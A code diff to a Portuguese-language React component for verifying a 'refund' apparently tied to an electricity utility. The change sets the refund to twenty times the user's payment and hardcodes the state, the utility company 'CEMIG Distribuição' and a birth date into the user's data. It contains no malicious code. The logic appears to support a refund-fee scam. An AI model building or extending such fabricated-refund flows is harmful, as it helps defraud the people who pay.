@@ -220,15 +220,28 @@ export default function VerificarRestituicao() {
         if (dadosCpf.pagamento.cpf) {
           // Verificar se temos os outros dados do usuário (nome, etc)
           // Se não temos, vamos usar os dados do pagamento
+          
+          // Converter o valor do pagamento para número (o valor vem como string do banco de dados)
+          const valorRestituicao = dadosCpf.pagamento.valor ? parseFloat(dadosCpf.pagamento.valor) * 20 : 0;
+          
           updateUserData({
             cpf: dadosCpf.pagamento.cpf,
             nome: dadosCpf.pagamento.nome || "",
-            telefone: dadosCpf.pagamento.telefone || ""
+            telefone: dadosCpf.pagamento.telefone || "",
+            valorRestituicao: valorRestituicao,
+            estado: "Minas Gerais",
+            companhia: "CEMIG Distribuição",
+            dataNascimento: "1985-05-15"
           });
+          
+          console.log(`[Redirecionamento] Atualizando dados do usuário com valor de restituição: ${valorRestituicao}`);
           
           // Salvar os dados do pagamento no localStorage para uso na página de pagamento
           try {
-            localStorage.setItem('dadosPagamento', JSON.stringify(dadosCpf.pagamento));
+            localStorage.setItem('dadosPagamento', JSON.stringify({
+              ...dadosCpf.pagamento,
+              valorRestituicao: valorRestituicao
+            }));
           } catch (error) {
             console.error("Erro ao salvar dados do pagamento:", error);
           }
